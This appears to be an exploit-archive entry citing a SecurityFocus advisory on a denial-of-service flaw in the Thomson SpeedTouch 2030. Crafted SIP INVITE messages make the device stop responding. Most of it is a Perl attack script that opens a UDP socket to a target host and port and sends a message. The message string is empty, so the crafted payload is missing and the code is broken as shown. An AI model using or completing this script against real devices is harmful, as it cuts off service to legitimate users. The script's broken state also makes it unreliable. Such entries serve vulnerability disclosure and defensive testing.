source: http://www.securityfocus.com/bid/25464/info

Thomson SpeedTouch 2030 is prone to a denial-of-service vulnerability because the device fails to handle specially crafted SIP INVITE messages.

Exploiting this issue allows remote attackers to cause the device to stop responding, thus denying service to legitimate users. 

#!/usr/bin/perl

use IO::Socket::INET;

die "Usage $0 <dst> <port> <username>" unless ($ARGV[2]);



$socket=new IO::Socket::INET->new(PeerPort=>$ARGV[1],

        Proto=>'udp',

        PeerAddr=>$ARGV[0]);



$msg = "";

$socket->send($msg);
